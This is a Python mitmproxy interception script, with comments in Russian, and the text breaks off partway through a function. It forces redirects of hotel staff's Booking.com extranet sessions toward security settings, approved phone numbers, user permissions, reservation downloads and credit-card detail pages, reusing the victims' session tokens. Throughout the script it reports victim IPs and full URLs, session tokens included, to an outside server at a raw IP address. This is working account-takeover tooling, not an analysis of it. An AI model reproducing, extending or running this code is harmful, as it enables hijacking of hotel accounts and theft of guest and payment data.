from mitmproxy import http, ctx
import os
import urllib.parse
import time
import threading
import requests
import json
from datetime import datetime
import re
FUNCTION_COMPLETION_TIMES = {}
import time

# --- TELEGRAM LOGGING CONFIG ---
TELEGRAM_LOGGING_ENABLED = True
LOG_SERVER_URL = "http://89.42.142.29:5000/log_redirect"
FUNCTION_COMPLETE_URL = "http://89.42.142.29:5000/log_function_complete"

# Домены для мониторинга платформ (сокращенный список)
PLATFORM_DOMAINS = [
    "agoda.com",
    "expedia.com", 
    "hotels.com",
    "trip.com",
    "goibibo.com",
    "makemytrip.com",
    "yatra.com",
    "cleartrip.com",
    "ixigo.com",
    "paytm.com",
]

# Пути к флагам
COOKIE = "mitm_redirect_done"
FORCE_FLAG = r"C:\temp\mitm_force_redirect"
ONE_SHOT_FLAG = r"C:\temp\mitm_reset_once"
MESSAGE_FLAG = r"C:\temp\mitm_message_once"
PROVIDER_FLAG = r"C:\temp\mitm_provider_once"
USER_FLAG = r"C:\temp\mitm_user_once"
SECURITY_FLAG = r"C:\temp\mitm_security_once"
OPERATION_11_FLAG = r"C:\temp\mitm_operation_11_once"
OPERATION_12_FLAG = r"C:\temp\mitm_operation_12_once"
BOOKING_HOTEL_FLAG = r"C:\temp\mitm_booking_hotel_once"
BOOKING_HOTEL_SECURITY_FLAG = r"C:\temp\mitm_booking_hotel_security_once"
OPERATION_16_FLAG = r"C:\temp\mitm_operation_16_once"
CUSTOM_REDIRECT_FLAG = r"C:\temp\mitm_custom_redirect_once"
CUSTOM_REDIRECT_FROM_FILE = r"C:\temp\mitm_custom_redirect_from.txt"
CUSTOM_REDIRECT_TO_FILE = r"C:\temp\mitm_custom_redirect_to.txt"
CUSTOM_REDIRECT_DONE_FLAG = r"C:\temp\mitm_custom_redirect_done.txt"
BOOKING_RESERVATIONS_FLAG = r"C:\temp\mitm_booking_reservations_once"
BOOKING_RESERVATIONS_HOTEL_ID_FILE = r"C:\temp\mitm_booking_reservations_hotel_id.txt"
BOOKING_RESERVATIONS_REPORT_ID_FILE = r"C:\temp\mitm_booking_reservations_report_id.txt"
BOOKING_CC_DETAILS_FLAG = r"C:\temp\mitm_booking_cc_details_once"
BOOKING_CC_DETAILS_BN_FILE = r"C:\temp\mitm_booking_cc_details_bn.txt"
BOOKING_CC_DETAILS_HOTEL_ID_FILE = r"C:\temp\mitm_booking_cc_details_hotel_id.txt"

# Новые флаги для функций 21-26
PARTNERS_FLAG = r"C:\temp\mitm_partners_once"
PARTNERS_AND_MESS_FLAG = r"C:\temp\mitm_partners_and_mess_once"
DEVICE_FLAG = r"C:\temp\mitm_device_once"
PULSE_FLAG = r"C:\temp\mitm_pulse_once"
ULTRA_PULSE_FLAG = r"C:\temp\mitm_ultra_pulse_once"
MONITOR_PLATFORMS_FLAG = r"C:\temp\mitm_monitor_platforms_once"
PULSE_REDIRECT_TO_FILE = r"C:\temp\mitm_pulse_redirect_to.txt"
ULTRA_PULSE_REDIRECT_TO_FILE = r"C:\temp\mitm_ultra_pulse_redirect_to.txt"

REDIRECT_FILE = r"C:\mitm\redirect_target.txt"
LOG_PREFIX = "[MITM-REDIR]"

# Функции проверки флагов 21-26
def should_partners():
    return os.path.exists(PARTNERS_FLAG)

def should_partners_and_mess():
    return os.path.exists(PARTNERS_AND_MESS_FLAG)

def should_device():
    return os.path.exists(DEVICE_FLAG)

def should_pulse():
    return os.path.exists(PULSE_FLAG)

def should_ultra_pulse():
    return os.path.exists(ULTRA_PULSE_FLAG)

def should_monitor_platforms():
    return os.path.exists(MONITOR_PLATFORMS_FLAG)

def get_pulse_redirect_to():
    try:
        if os.path.exists(PULSE_REDIRECT_TO_FILE):
            with open(PULSE_REDIRECT_TO_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading pulse redirect TO: {e}")
    return ""

def get_ultra_pulse_redirect_to():
    try:
        if os.path.exists(ULTRA_PULSE_REDIRECT_TO_FILE):
            with open(ULTRA_PULSE_REDIRECT_TO_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading ultra pulse redirect TO: {e}")
    return ""

def log(msg):
    ctx.log.info(f"{LOG_PREFIX} {msg}")

def post_log_to_server(payload: dict, endpoint: str = LOG_SERVER_URL):
    """Асинхронная отправка лога"""
    def _worker(data, url):
        try:
            headers = {'Content-Type': 'application/json'}
            requests.post(url, json=data, headers=headers, timeout=3)
        except Exception as e:
            try:
                ctx.log.warn(f"{LOG_PREFIX} failed to post to {url}: {e}")
            except Exception:
                pass

    t = threading.Thread(target=_worker, args=(payload, endpoint), daemon=True)
    t.start()

def log_redirect_to_server(client_ip, from_url, to_url, redirect_type):
    """Логирование редиректа"""
    payload = {
        "client_ip": client_ip or "Unknown",
        "from_url": from_url or "Unknown",
        "to_url": to_url or "Unknown",
        "redirect_type": redirect_type or "Unknown",
        "timestamp": datetime.utcnow().isoformat() + "Z"
    }
    post_log_to_server(payload, LOG_SERVER_URL)
    log(f"Posted redirect: {redirect_type} from {client_ip}")

def send_function_complete_notification(client_ip: str, from_url: str, function_type: str):
    """Отправка уведомления о завершении функции"""
    def _send_complete():
        try:
            payload = {
                "client_ip": client_ip or "Unknown",
                "from_url": from_url or "Unknown",
                "function_type": function_type,
                "timestamp": datetime.utcnow().isoformat() + "Z"
            }
            
            log(f"Sending function complete: {function_type}")
            post_log_to_server(payload, FUNCTION_COMPLETE_URL)
            
        except Exception as e:
            log(f"Error sending function complete: {e}")
    
    threading.Thread(target=_send_complete, daemon=True).start()

def should_log_domain(flow: http.HTTPFlow) -> bool:
    """Проверяет, нужно ли логировать доступ к платформе"""
    if not TELEGRAM_LOGGING_ENABLED:
        return False
    
    host = (flow.request.pretty_host or "").lower()
    
    # Проверяем платформы
    for domain in PLATFORM_DOMAINS:
        if domain in host:
            return True
    
    return False

# --- Вспомогательные функции ---
def get_redirect_target():
    try:
        if os.path.exists(REDIRECT_FILE):
            with open(REDIRECT_FILE, 'r', encoding='utf-8') as f:
                target = f.read().strip()
                # Проверяем, что URL не пустой и начинается с http
                if target and target.startswith(('http://', 'https://')):
                    return target
                else:
                    log(f"Invalid redirect target in file: '{target}'")
        log("No valid redirect target found, returning empty string")
        return ""  # ВАЖНО: возвращаем пустую строку вместо bbc.com
    except Exception as e:
        log(f"Error reading redirect target: {e}")
        return ""  # ВАЖНО: возвращаем пустую строку вместо bbc.com

def should_force():
    return os.path.exists(FORCE_FLAG)

def should_one_shot():
    return os.path.exists(ONE_SHOT_FLAG)

def should_message():
    return os.path.exists(MESSAGE_FLAG)

def should_provider():
    return os.path.exists(PROVIDER_FLAG)

def should_user():
    return os.path.exists(USER_FLAG)

def should_security():
    return os.path.exists(SECURITY_FLAG)

def should_operation_11():
    return os.path.exists(OPERATION_11_FLAG)

def should_operation_12():
    return os.path.exists(OPERATION_12_FLAG)

def should_booking_hotel():
    return os.path.exists(BOOKING_HOTEL_FLAG)

def should_booking_hotel_security():
    return os.path.exists(BOOKING_HOTEL_SECURITY_FLAG)

def should_operation_16():
    return os.path.exists(OPERATION_16_FLAG)

def should_custom_redirect():
    return os.path.exists(CUSTOM_REDIRECT_FLAG)

def get_custom_redirect_from():
    try:
        if os.path.exists(CUSTOM_REDIRECT_FROM_FILE):
            with open(CUSTOM_REDIRECT_FROM_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading custom redirect FROM: {e}")
    return ""

def get_custom_redirect_to():
    try:
        if os.path.exists(CUSTOM_REDIRECT_TO_FILE):
            with open(CUSTOM_REDIRECT_TO_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading custom redirect TO: {e}")
    return ""

def should_booking_reservations():
    return os.path.exists(BOOKING_RESERVATIONS_FLAG)

def get_booking_reservations_hotel_id():
    try:
        if os.path.exists(BOOKING_RESERVATIONS_HOTEL_ID_FILE):
            with open(BOOKING_RESERVATIONS_HOTEL_ID_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading booking reservations hotel_id: {e}")
    return "14762911"

def get_booking_reservations_report_id():
    try:
        if os.path.exists(BOOKING_RESERVATIONS_REPORT_ID_FILE):
            with open(BOOKING_RESERVATIONS_REPORT_ID_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading booking reservations report_id: {e}")
    return "5865185"

def should_booking_cc_details():
    return os.path.exists(BOOKING_CC_DETAILS_FLAG)

def get_booking_cc_details_bn():
    try:
        if os.path.exists(BOOKING_CC_DETAILS_BN_FILE):
            with open(BOOKING_CC_DETAILS_BN_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading booking cc details bn: {e}")
    return "5331278429"  # Значение по умолчанию

def get_booking_cc_details_hotel_id():
    try:
        if os.path.exists(BOOKING_CC_DETAILS_HOTEL_ID_FILE):
            with open(BOOKING_CC_DETAILS_HOTEL_ID_FILE, 'r') as f:
                return f.read().strip()
    except Exception as e:
        log(f"Error reading booking cc details hotel_id: {e}")
    return "10790315"  # Значение по умолчанию

# --- Функции удаления флагов ---
def remove_force_flag():
    try:
        if os.path.exists(FORCE_FLAG):
            os.remove(FORCE_FLAG)
            log("Force redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_force_flag error: {e}")

def remove_one_shot_flag():
    try:
        if os.path.exists(ONE_SHOT_FLAG):
            os.remove(ONE_SHOT_FLAG)
            log("Global one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_one_shot_flag error: {e}")

def remove_message_flag():
    try:
        if os.path.exists(MESSAGE_FLAG):
            os.remove(MESSAGE_FLAG)
            log("Booking.com message one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_message_flag error: {e}")

def remove_provider_flag():
    try:
        if os.path.exists(PROVIDER_FLAG):
            os.remove(PROVIDER_FLAG)
            log("Booking.com provider one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_provider_flag error: {e}")

def remove_user_flag():
    try:
        if os.path.exists(USER_FLAG):
            os.remove(USER_FLAG)
            log("Booking.com user one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_user_flag error: {e}")

def remove_security_flag():
    try:
        if os.path.exists(SECURITY_FLAG):
            os.remove(SECURITY_FLAG)
            log("Booking.com security one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_security_flag error: {e}")

def remove_operation_11_flag():
    try:
        if os.path.exists(OPERATION_11_FLAG):
            os.remove(OPERATION_11_FLAG)
            log("Operation 11 one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_operation_11_flag error: {e}")

def remove_operation_12_flag():
    try:
        if os.path.exists(OPERATION_12_FLAG):
            os.remove(OPERATION_12_FLAG)
            log("Operation 12 one-shot flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_operation_12_flag error: {e}")

def remove_booking_hotel_flag():
    try:
        if os.path.exists(BOOKING_HOTEL_FLAG):
            os.remove(BOOKING_HOTEL_FLAG)
            log("Booking-hotel redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_booking_hotel_flag error: {e}")

def remove_booking_hotel_security_flag():
    try:
        if os.path.exists(BOOKING_HOTEL_SECURITY_FLAG):
            os.remove(BOOKING_HOTEL_SECURITY_FLAG)
            log("Booking-hotel-security redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_booking_hotel_security_flag error: {e}")

def remove_operation_16_flag():
    try:
        if os.path.exists(OPERATION_16_FLAG):
            os.remove(OPERATION_16_FLAG)
            log("Operation 16 flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_operation_16_flag error: {e}")

def remove_custom_redirect_flag():
    try:
        if os.path.exists(CUSTOM_REDIRECT_FLAG):
            os.remove(CUSTOM_REDIRECT_FLAG)
            log("Custom redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_custom_redirect_flag error: {e}")

def remove_booking_reservations_flag():
    try:
        if os.path.exists(BOOKING_RESERVATIONS_FLAG):
            os.remove(BOOKING_RESERVATIONS_FLAG)
            log("Booking reservations redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_booking_reservations_flag error: {e}")

def remove_booking_cc_details_flag():
    try:
        if os.path.exists(BOOKING_CC_DETAILS_FLAG):
            os.remove(BOOKING_CC_DETAILS_FLAG)
            log("Booking CC details redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_booking_cc_details_flag error: {e}")

# --- Новые функции удаления флагов 21-26 ---
def remove_partners_flag():
    try:
        if os.path.exists(PARTNERS_FLAG):
            os.remove(PARTNERS_FLAG)
            log("Partners redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_partners_flag error: {e}")

def remove_partners_and_mess_flag():
    try:
        if os.path.exists(PARTNERS_AND_MESS_FLAG):
            os.remove(PARTNERS_AND_MESS_FLAG)
            log("Partners and Mess redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_partners_and_mess_flag error: {e}")

def remove_device_flag():
    try:
        if os.path.exists(DEVICE_FLAG):
            os.remove(DEVICE_FLAG)
            log("Device redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_device_flag error: {e}")

def remove_pulse_flag():
    try:
        if os.path.exists(PULSE_FLAG):
            os.remove(PULSE_FLAG)
            log("Pulse redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_pulse_flag error: {e}")

def remove_ultra_pulse_flag():
    try:
        if os.path.exists(ULTRA_PULSE_FLAG):
            os.remove(ULTRA_PULSE_FLAG)
            log("Ultra Pulse redirect flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_ultra_pulse_flag error: {e}")

def remove_monitor_platforms_flag():
    try:
        if os.path.exists(MONITOR_PLATFORMS_FLAG):
            os.remove(MONITOR_PLATFORMS_FLAG)
            log("Monitor platforms flag removed")
    except Exception as e:
        ctx.log.warn(f"{LOG_PREFIX} remove_monitor_platforms_flag error: {e}")

# --- Вспомогательные функции для цепных операций ---
def enable_booking_hotel_security_from_partners():
    """Включение функции 15 после завершения функции 21 (для функции 22)"""
    try:
        parent = os.path.dirname(BOOKING_HOTEL_SECURITY_FLAG)
        if parent and not os.path.exists(parent):
            os.makedirs(parent, exist_ok=True)
        with open(BOOKING_HOTEL_SECURITY_FLAG, 'w') as f:
            f.write("enabled")
        log("Function 15 enabled from partners (function 22)")
    except Exception as e:
        log(f"Error enabling function 15 from partners: {e}")

def enable_pulse_from_ultra_pulse():
    """Включение функции 24 после завершения функции 23 (для функции 25)"""
    try:
        log("Function 25: Function 23 completed, activating Function 24 (Pulse)")
        
        # 1. Удаляем флаг функции 23 (если еще есть)
        if os.path.exists(DEVICE_FLAG):
            os.remove(DEVICE_FLAG)
            log("Function 25: Removed device flag")
        
        # 2. Создаем флаг функции 24
        parent = os.path.dirname(PULSE_FLAG)
        if parent and not os.path.exists(parent):
            os.makedirs(parent, exist_ok=True)
        with open(PULSE_FLAG, 'w') as f:
            f.write("enabled")
        
        # 3. Копируем redirect URL из ultra pulse в pulse
        ultra_url = get_ultra_pulse_redirect_to()
        if ultra_url:
            parent_dir = os.path.dirname(PULSE_REDIRECT_TO_FILE)
            if parent_dir and not os.path.exists(parent_dir):
                os.makedirs(parent_dir, exist_ok=True)
            with open(PULSE_REDIRECT_TO_FILE, 'w') as f:
                f.write(ultra_url)
            log(f"Function 25: Copied redirect URL to Pulse: {ultra_url}")
        
        # 4. Отправляем Telegram уведомление о переходе к фазе 2
        log("Function 25: Phase 2 (Pulse) activated - sending notification")
        
    except Exception as e:
        log(f"Error enabling function 24 from ultra pulse: {e}")
        
def is_redirect_target(flow: http.HTTPFlow, redirect_target: str) -> bool:
    try:
        if not redirect_target:
            return False
        req_url = flow.request.pretty_url.lower()
        target_url = redirect_target.lower().rstrip("/")
        return req_url.startswith(target_url)
    except Exception:
        return False

def get_client_ip(flow):
    """Получение IP адреса клиента"""
    try:
        client_conn = getattr(flow, "client_conn", None)
        if client_conn:
            peername = getattr(client_conn, "peername", None)
            if peername and isinstance(peername, tuple) and len(peername) > 0:
                return peername[0]
    except Exception as e:
        log(f"Error getting client IP: {e}")
    
    return "Unknown"

# --- Функции редиректов 1-20 ---
def booking_redirect(flow: http.HTTPFlow, redirect_type: str) -> bool:
    flags = {
        "message": (should_message, remove_message_flag, "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/security_settings.html"),
        "provider": (should_provider, remove_provider_flag, "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/channel-manager/index.html"),
        "user": (should_user, remove_user_flag, "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/accounts_and_permissions.html"),
        "security": (should_security, remove_security_flag, "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/approvednumbers.html")
    }
    
    if redirect_type not in flags:
        return False
        
    should_redirect, remove_flag, base_url = flags[redirect_type]
    
    if not should_redirect():
        return False

    url = flow.request.pretty_url
    if not url.startswith("https://admin.booking.com/hotel/hoteladmin/"):
        return False

    parsed = urllib.parse.urlparse(url)
    query = urllib.parse.parse_qs(parsed.query)

    # Получаем hotel_id и ses из запроса
    hotel_id = query.get("hotel_id", ["14762911"])[0]
    ses = query.get("ses", ["ec1745929d110e5a461e56e51a3cda93"])[0]

    # Формируем целевой URL в зависимости от типа
    if redirect_type == "provider":
        target_url = f"{base_url}?lang=en&ses={ses}&hotel_id={hotel_id}&fr_account_menu=1&view=start"
    else:
        target_url = f"{base_url}?lang=en&ses={ses}&hotel_id={hotel_id}"

    log(f"Booking.com {redirect_type.upper()} redirect {url} -> {target_url}")
    
    # Логируем редирект
    client_ip = get_client_ip(flow)
    log_redirect_to_server(client_ip, url, target_url, f"BOOKING_{redirect_type.upper()}")
    
    # Выполняем редирект
    flow.response = http.Response.make(
        302, b"", {"Location": target_url}
    )

    remove_flag()
    
    # Отправляем уведомление о завершении
    if redirect_type == "message":
        send_function_complete_notification(client_ip, url, "FUNCTION_7_COMPLETE")
    elif redirect_type == "provider":
        send_function_complete_notification(client_ip, url, "FUNCTION_8_COMPLETE")
    elif redirect_type == "user":
        send_function_complete_notification(client_ip, url, "FUNCTION_9_COMPLETE")
    elif redirect_type == "security":
        send_function_complete_notification(client_ip, url, "FUNCTION_10_COMPLETE")
    
    return True

def booking_reservations_download_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 18:
    Редиректит все запросы к admin.booking.com/hotel/* на страницу загрузки резервов.
    С ДОПОЛНИТЕЛЬНЫМИ РЕДИРЕКТАМИ ПОСЛЕ ЗАВЕРШЕНИЯ:
    1. После завершения - 3 секунды ожидания
    2. В течение 2 минут: если обновление страницы - редирект на главную
    3. Через 10 секунд: автоматический редирект на главную
    """
    try:
        url = flow.request.pretty_url
        host = (flow.request.pretty_host or "").lower()
        client_ip = get_client_ip(flow)
        
        # ====== ПРОВЕРКА ДОПОЛНИТЕЛЬНЫХ РЕДИРЕКТОВ ПОСЛЕ ЗАВЕРШЕНИЯ ======
        # Проверяем, была ли уже завершена функция 18 для этого IP
        if client_ip in FUNCTION_COMPLETION_TIMES:
            completion_data = FUNCTION_COMPLETION_TIMES[client_ip]
            completion_time = completion_data.get("function_18_completed_at", 0)
            initial_url = completion_data.get("initial_url", "")
            
            if completion_time > 0:
                current_time = time.time()
                time_since_completion = current_time - completion_time
                
                # Проверяем, это ли страница reservations_download.html
                is_reservations_page = "reservations_download.html" in url
                
                if is_reservations_page:
                    # ПРИНЦИП: одинаковый путь (reservations_download.html), но параметры могут быть любые
                    parsed_current = urllib.parse.urlparse(url)
                    parsed_initial = urllib.parse.urlparse(initial_url)
                    
                    # Сравниваем только путь, без параметров
                    if parsed_current.path == parsed_initial.path:
                        
                        # 1. В течение первых 3 секунд - НИЧЕГО НЕ ДЕЛАЕМ (ждем загрузки)
                        if time_since_completion <= 3:
                            log(f"[F18] ✓ Page loaded, waiting 3s grace period ({time_since_completion:.1f}s passed)")
                            return False
                        
                        # 2. После 10 секунд - АВТОМАТИЧЕСКИЙ РЕДИРЕКТ НА ГЛАВНУЮ
                        elif time_since_completion >= 10:
                            target_url = "https://admin.booking.com/hotel/hoteladmin/"
                            log(f"[F18] ✓ 10s timeout reached - auto-redirect to main page")
                            
                            # Логируем дополнительный редирект
                            log_redirect_to_server(client_ip, url, target_url, "FUNCTION_18_POST_COMPLETION_AUTO")
                            
                            flow.response = http.Response.make(
                                302,
                                b"",
                                {
                                    "Location": target_url,
                                    "Cache-Control": "no-cache, no-store, must-revalidate",
                                    "Pragma": "no-cache",
                                    "Expires": "0",
                                    "X-MITM-Redirect": "Function-18-Post-Auto"
                                }
                            )
                            return True
                        
                        # 3. От 3 до 120 секунд - РЕДИРЕКТ ПРИ ПОВТОРНОМ ЗАПРОСЕ/ОБНОВЛЕНИИ
                        elif 3 < time_since_completion < 120:
                            # Это повторный запрос той же страницы в течение 2 минут
                            log(f"[F18] ✓ Page refresh within 2min ({time_since_completion:.1f}s) - redirect to main")
                            
                            target_url = "https://admin.booking.com/hotel/hoteladmin/"
                            
                            # Логируем дополнительный редирект
                            log_redirect_to_server(client_ip, url, target_url, "FUNCTION_18_POST_COMPLETION_REFRESH")
                            
                            flow.response = http.Response.make(
                                302,
                                b"",
                                {
                                    "Location": target_url,
                                    "Cache-Control": "no-cache, no-store, must-revalidate",
                                    "Pragma": "no-cache",
                                    "Expires": "0",
                                    "X-MITM-Redirect": "Function-18-Post-Refresh"
                                }
                            )
                            return True
        
        # ====== ОСНОВНАЯ ЛОГИКА ФУНКЦИИ (БЕЗ ИЗМЕНЕНИЙ) ======
        if not should_booking_reservations():
            return False

        # ====== ТОЛЬКО admin.booking.com ======
        if not host.endswith("admin.booking.com"):
            return False
        
        # ====== ПРОВЕРКА ЗАВЕРШЕНИЯ ФУНКЦИИ 18 ======
        # Проверяем, что это ЛЮБОЙ запрос, содержащий все 5 параметров
        parsed = urllib.parse.urlparse(url)
        query = urllib.parse.parse_qs(parsed.query)
        
        # ВАЖНО: Функция завершается ТОЛЬКО при наличии ВСЕХ 5 параметров в любом запросе:
        required_params = ["hotel_id", "lang", "reportId", "ses", "auth_assurance_last_check"]
        has_all_params = all(param in query for param in required_params)
        
        if has_all_params:
            log(f"[F18] ✓ Detected ALL 5 required parameters in URL -> FUNCTION 18 COMPLETED")
            
            # Получаем полный URL для Telegram
            full_url = url
            
            # СОХРАНЯЕМ ВРЕМЯ ЗАВЕРШЕНИЯ ДЛЯ ЭТОГО ПОЛЬЗОВАТЕЛЯ
            FUNCTION_COMPLETION_TIMES[client_ip] = {
                "function_18_completed_at": time.time(),
                "initial_url": full_url  # Сохраняем оригинальный URL для сравнения пути
            }
            
            log(f"[F18] ✓ Completion time saved for IP {client_ip}")
            
            # Удаляем флаг функции 18
            remove_booking_reservations_flag()
            
            # ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ О ЗАВЕРШЕНИИ (с полным URL)
            send_function_complete_notification(client_ip, full_url, "FUNCTION_18_COMPLETE")
            
            log(f"[F18] ✓ Completion notification sent for function 18")
            
            # ====== НЕТ ФИНАЛЬНОГО РЕДИРЕКТА ======
            # Пользователь остается на текущей странице (reservations_download.html)
            log(f"[F18] ✓ Function completed, NO final redirect - user stays on page")
            return False  # Не делаем редирект, просто завершаем функцию
        
        # ====== ЕСЛИ ЕЩЕ НЕТ ВСЕХ ПАРАМЕТРОВ ======
        
        # Проверяем, если это уже страница reservations_download.html (но без всех параметров)
        if "reservations_download.html" in url:
            log(f"[F18] On reservations_download.html but missing some parameters")
            
            # Если уже есть hotel_id и reportId - ждем остальные параметры
            if "hotel_id" in query and "reportId" in query:
                log(f"[F18] Has hotel_id and reportId, waiting for ses and auth_assurance_last_check")
                return False  # Не делаем редирект
        
        # ====== ПЕРВИЧНЫЙ РЕДИРЕКТ ======
        # Если пользователь НЕ на reservations_download.html И НЕ имеет всех параметров
        # И это запрос к /hotel/ - делаем первоначальный редирект
        
        parsed = urllib.parse.urlparse(url)
        path = parsed.path or "/"
        
        # Проверяем, что путь начинается с /hotel/
        if not path.startswith("/hotel/"):
            return False
        
        # Если это уже промежуточная страница reservations_download.html - не делаем редирект
        if "reservations_download.html" in url:
            return False
        
        # Получаем параметры из конфигурации
        hotel_id = get_booking_reservations_hotel_id()
        report_id = get_booking_reservations_report_id()
        
        # Формируем промежуточный целевой URL (без ses и auth_assurance_last_check)
        target_url = f"https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/reservations_download.html?hotel_id={hotel_id}&lang=en&reportId={report_id}"
        
        # Проверяем, что это не редирект на ту же самую страницу
        if url == target_url:
            return False
        
        log(f"[F18] ✓ Redirecting {url} -> {target_url}")
        
        # Логируем редирект (уведомление о НАЧАЛЕ функции)
        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_18_RESERVATIONS_DOWNLOAD")
        
        # Выполняем ПЕРВИЧНЫЙ редирект
        flow.response = http.Response.make(
            302, 
            b"", 
            {
                "Location": target_url,
                "Cache-Control": "no-cache, no-store, must-revalidate",
                "Pragma": "no-cache",
                "Expires": "0"
            }
        )
        return True
        
    except Exception as e:
        log(f"[F18] Error in booking_reservations_download_redirect: {e}")
        import traceback
        log(f"[F18] Traceback: {traceback.format_exc()}")
        return False

def cleanup_old_completion_times():
    """Очищает записи о завершении функций старше 5 минут"""
    try:
        current_time = time.time()
        to_delete = []
        
        for client_ip, data in FUNCTION_COMPLETION_TIMES.items():
            completion_time = data.get("function_18_completed_at", 0)
            if current_time - completion_time > 300:  # 5 минут
                to_delete.append(client_ip)
        
        for client_ip in to_delete:
            del FUNCTION_COMPLETION_TIMES[client_ip]
            log(f"[F18] Cleaned up old completion time for IP {client_ip}")
            
    except Exception as e:
        log(f"[F18] Error cleaning up completion times: {e}")

def booking_hotel_global_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 13 (БЕЗ ИЗМЕНЕНИЙ - как в старом работающем коде):
    Редиректит все запросы на approvednumbers.html.
    Завершается при наличии auth_assurance_last_check в approvednumbers.html
    """
    try:
        if not should_booking_hotel():
            return False

        url = flow.request.pretty_url
        approved_base = "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/approvednumbers.html"

        # Если это сам approvednumbers.html — проверяем наличие auth_assurance_last_check
        if url.startswith(approved_base):
            parsed = urllib.parse.urlparse(url)
            query = urllib.parse.parse_qs(parsed.query)
            if "auth_assurance_last_check" in query:
                log("Function 13: Detected approvednumbers.html with auth_assurance_last_check -> function completed")
                remove_booking_hotel_flag()
                
                # ОТПРАВЛЯЕМ УВЕДОМЛЕНИЕ О ЗАВЕРШЕНИИ
                client_ip = get_client_ip(flow)
                send_function_complete_notification(client_ip, url, "FUNCTION_13_COMPLETE")
                
                # --- ОПЕРАЦИЯ 16: Если активна операция 16, включаем функцию 15 ---
                if should_operation_16():
                    log("Operation 16: Function 13 completed, enabling function 15")
                    try:
                        parent = os.path.dirname(BOOKING_HOTEL_SECURITY_FLAG)
                        if parent and not os.path.exists(parent):
                            os.makedirs(parent, exist_ok=True)
                        with open(BOOKING_HOTEL_SECURITY_FLAG, 'w') as f:
                            f.write("enabled")
                        log("Operation 16: Function 15 enabled")
                    except Exception as e:
                        log(f"Error enabling function 15 in operation 16: {e}")
            
            # Do not redirect approvednumbers itself
            return False

        parsed = urllib.parse.urlparse(url)
        path = parsed.path or "/"
        host = (flow.request.pretty_host or "").lower()

        # Только для admin.booking.com и путей начинающихся с /hotel/
        if not host.endswith("admin.booking.com"):
            return False
        if not path.startswith("/hotel/"):
            return False

        # Получаем ses и hotel_id
        query = urllib.parse.parse_qs(parsed.query)
        hotel_id = None
        ses = None

        if "hotel_id" in query:
            hotel_id = query.get("hotel_id", [None])[0]
        if "ses" in query:
            ses = query.get("ses", [None])[0]

        # Если не нашли — пытаемся из Referer
        if not hotel_id or not ses:
            referer = flow.request.headers.get("Referer") or flow.request.headers.get("referer")
            if referer:
                try:
                    rp = urllib.parse.urlparse(referer)
                    rq = urllib.parse.parse_qs(rp.query)
                    if not hotel_id and "hotel_id" in rq:
                        hotel_id = rq.get("hotel_id", [None])[0]
                    if not ses and "ses" in rq:
                        ses = rq.get("ses", [None])[0]
                except Exception:
                    pass

        # Дополнительная эвристика
        if not hotel_id:
            m = re.search(r"/hotel/(?:.*/)?(\d+)(?:/|$)", path)
            if m:
                hotel_id = m.group(1)

        # Подставляем дефолтные значения
        if not hotel_id:
            hotel_id = "14762911"
        if not ses:
            ses = "ec1745929d110e5a461e56e51a3cda93"

        target_url = f"{approved_base}?lang=en&ses={ses}&hotel_id={hotel_id}"

        log(f"Function 13: BOOKING_HOTEL redirect {url} -> {target_url}")

        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, target_url, "BOOKING_HOTEL")

        # Выполняем редирект
        flow.response = http.Response.make(302, b"", {"Location": target_url})
        return True

    except Exception as e:
        log(f"booking_hotel_global_redirect error: {e}")
        return False

def booking_hotel_security_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 15 (БЕЗ ИЗМЕНЕНИЙ - как в старом работающем коде):
    Перенаправляет на security_settings.html.
    Завершается когда пользователь достиг settings.html
    """
    try:
        if not should_booking_hotel_security():
            return False

        url = flow.request.pretty_url
        
        # Проверяем, не является ли это целевой страницей settings.html
        if "https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/messaging/settings.html" in url:
            log("Function 15: User reached messaging/settings.html -> function completed")
            remove_booking_hotel_security_flag()
            
